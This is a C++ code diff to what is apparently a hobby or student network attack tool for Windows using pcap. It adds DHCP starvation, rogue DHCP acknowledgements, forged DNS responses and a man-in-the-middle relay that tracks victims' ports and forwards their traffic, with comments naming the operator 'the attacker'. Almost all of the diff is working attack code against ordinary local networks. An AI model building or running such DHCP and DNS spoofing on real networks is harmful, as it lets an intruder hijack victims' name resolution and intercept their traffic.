@@ -20,6 +20,8 @@
 #pragma pack(1)
 #pragma comment(lib, "Ws2_32.lib")
 
+#include <map>
+
 void getDHCPPacketInfo(char* packet, DHCP_header& pDHCP, UDP_header& pUDP, IP_header& pIP);
 
 int sendDiscoverPacket(AddressInfo& info)
@@ -97,7 +99,7 @@ int sendOfferPacket(DHCP_header& rDHCP, IP_header& rIP, AddressInfo& info)
 
 int sendACKPacket(char* raw_packet, DHCP_header& rDHCP, IP_header& rIP, pcap_t* sock, AddressInfo& info)
 {
-	createDHCPackPacket(raw_packet, (void*)&rDHCP, (void*)&rIP, info);
+	createDHCPackPacket(raw_packet, (void*)&rDHCP, (void*)&rIP, info); //Creating an acknowladge packet
 
 	if (pcap_sendpacket(
 		sock,
@@ -111,9 +113,18 @@ int sendACKPacket(char* raw_packet, DHCP_header& rDHCP, IP_header& rIP, pcap_t* 
 	return 0;
 }
 
-int sendDNSResponse(char* raw_packet, char* qDNS, pcap_t* sock, AddressInfo& info)
+int sendDNSResponse(char* raw_packet, char* qDNS, pcap_t* sock, std::map<uint16_t, uint32_t> portForwarding, AddressInfo& info)
 {
-	size_t tSize = createDNSResponsePacket(raw_packet, qDNS, info);
+	size_t  tSize = createDNSResponsePacket(raw_packet, qDNS, info); // Creating the DNS response packet and 
+																	// returning the size of the packet
+	if (tSize == -1) /* Chcking for an impossible size, that means the packet has to be sent to a real DNS server*/
+	{
+		return 0; // no MITM for now
+		/*
+		portForwarding.insert(std::pair< uint16_t, uint32_t>(((UDP_header*)&qDNS[sizeof(IP_header)])->src_port, ((IP_header*)qDNS)->ip_srcaddr));
+		tSize = dnsMITM(qDNS, (uint8_t*)raw_packet, info);
+		*/
+	}
 	if(pcap_sendpacket(
 		sock,
 		(u_char*)raw_packet,
@@ -124,6 +135,19 @@ int sendDNSResponse(char* raw_packet, char* qDNS, pcap_t* sock, AddressInfo& inf
 		return 1;
 	}
 	return 0;
+}
+
+int dnsMITM(char* qDNS, uint8_t* raw_packet, AddressInfo& info)
+{ 
+	uint8_t* dstmac = getARPinformation(inet_addr((char*)info.gateWay));
+	return manInTheMiddle(
+		qDNS,
+		raw_packet,
+		dstmac,
+		53,
+		inet_addr((char*)info.DNS_IP),
+		info
+	);
 }
 
 DWORD WINAPI startDHCPStarvation(LPVOID info)
@@ -139,7 +163,10 @@ DWORD WINAPI startDHCPStarvation(LPVOID info)
 
 DWORD WINAPI startSpoofing(LPVOID info)
 {
+	/*Creating the socket that listens to the traffic going through the adapter*/
 	SOCKET s;
+	pcap_t* sock;
+
 	sockaddr_in sockinfo;
 	sockaddr_in dst;
 	int size = sizeof(dst);
@@ -147,78 +174,109 @@ DWORD WINAPI startSpoofing(LPVOID info)
 	int optval = 1;
 	int in;
 	int error;
-	bool sent = false;
+	bool responseError = false;
 
 	DHCP_header pDHCP{};
 	UDP_header pUDP{};
 	IP_header pIP{};
-
+	
 	sockinfo.sin_addr.s_addr = inet_addr((const char*)(*(AddressInfo*)(info)).ipv4);
 	sockinfo.sin_family = AF_INET;
 	sockinfo.sin_port = htons(0);
 
-	//socket for recieving packets
 	s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); //Create a RAW socket
+	
+	/*The socket for responding, can control the Dlink layer*/
+	sock = pcap_open(getDeviceName(*(AddressInfo*)info), 0, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);
 
-	if (s == SOCKET_ERROR)
+	/*End of inting the socket*/
+
+	/*The receiving and responding packets, built only once to be more efficient*/
+	char* raw_packet = new char[65536];
+	char* response_packet = new char[65536];
+
+	/*Creating a map for port forwarding*/
+	std::map<uint16_t, uint32_t> portTable{};
+
+	if (s == SOCKET_ERROR) /*Checking for an error in the creation of the socket*/
 	{
 		std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
-		WSACleanup();
-		return 1;
+		goto creationError;
 	}
-
 
 	bind(s, (sockaddr*)&sockinfo, sizeof(sockinfo));
 
-	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval) == -1) //Set the socket as a RAW socket
+	/*Setting the socket to raw mode and checking for erroes*/
+	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval) == -1)
 	{
-		std::cout << "setsockopt error: " << WSAGetLastError() << std::endl;
-		WSACleanup();
-		return 1;
+		std::cout << "setsockopt error <" << WSAGetLastError() << ">" << std::endl;
+		goto creationError;
 	}
 	WSAIoctl(s, SIO_RCVALL, &optval, sizeof(optval), 0, 0, (LPDWORD)&in, 0, 0);
 
-	char* raw_packet = new char[65536];
-	memset(raw_packet, 0, 65536);
-	char* response_packet = new char[65536];
-	
-	// socket for sending ack
-	pcap_t* sock = pcap_open(getDeviceName(*(AddressInfo*)info), 0, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);
 
-	if (!sock)
+	if (!sock) /*Checking for an error in the creation of the socket*/
 	{
-		std::cout << "error in pcap socket" << std::endl;
-		return -1;
+		std::cout << "error in pcap socket <" << pcap_geterr(sock) << ">" << std::endl;
+		goto creationError;
 	}
 
-	// listening 
-	while (!sent)
+
+	/*Listens while no error occured*/
+	while (!responseError)
 	{
+		/*Clearing the data of prior packets*/
 		memset(response_packet, 0, 65536);
+		memset(raw_packet, 0, 65536);
 
-		error = recvfrom(s, raw_packet, 65536, 0, (sockaddr*)&dst, &size);
+		/*Recieve packets*/
+		error = recvfrom(s, raw_packet, 65536, 0, (sockaddr*)&dst, &size); 
 
-		if (error == SOCKET_ERROR)
+		if (error == SOCKET_ERROR) /*Check for an error*/
 		{
 			std::cout << " recv error: " << WSAGetLastError() << std::endl;
-			WSACleanup();
-			return 1;
+			goto creationError;
 		}
 
-		getDHCPPacketInfo(raw_packet, pDHCP, pUDP, pIP);
+		getDHCPPacketInfo(raw_packet, pDHCP, pUDP, pIP); //Puts the data of the packet in the assosiated structs
 
-		if (checkForDHCP(pDHCP))
-			if (getDHCPtype(pDHCP) == 3)
-				sent = sendACKPacket(response_packet, pDHCP, pIP, sock,(*(AddressInfo*)(info)));
-		if (pUDP.dst_port == htons(53))
-			if (pIP.ip_version == 4)
-				if(pIP.ip_srcaddr != inet_addr((char*)((AddressInfo*)info)->ipv4))
-					sent = sendDNSResponse(response_packet, raw_packet, sock, (*(AddressInfo*)(info)));
+		
+		if (checkForDHCP(pDHCP)) // Checks for the marking of a DHCP header
+			if (getDHCPtype(pDHCP) == 3) // Checks for a request packet
+				responseError = sendACKPacket(response_packet, pDHCP, pIP, sock,(*(AddressInfo*)(info)));
+		if (pUDP.dst_port == htons(53)) // Checks for a DNS packet
+			if(pIP.ip_srcaddr != inet_addr((char*)((AddressInfo*)info)->ipv4)) // Checks the packet wasnt sent by the attacker
+				responseError = sendDNSResponse(response_packet, raw_packet, sock, portTable, (*(AddressInfo*)(info)));
+		if (portTable.find(htons(pUDP.dst_port)) != portTable.end())
+		{
+			int size = manInTheMiddle(
+					response_packet,
+					(uint8_t*)raw_packet,
+					getARPinformation(portTable.find(htons(pUDP.dst_port))->second),
+					pUDP.dst_port,
+					portTable.find(htons(pUDP.dst_port))->second,
+					(*(AddressInfo*)info)
+				);
 
+			if (!pcap_sendpacket(
+				sock,
+				(u_char*)response_packet,
+				size
+			))
+			{
+				std::cout << "error " << pcap_geterr(sock) << std::endl;
+				responseError = 1;
+			}
+			portTable.erase(htons(pUDP.dst_port));
+
+		}
 	}
+//When an error occures the code jumps here
+creationError: 
 	delete[] response_packet;
 	delete[] raw_packet;
 	closesocket(s);
 	pcap_close(sock);
+	WSACleanup();
 	return -1;
 }
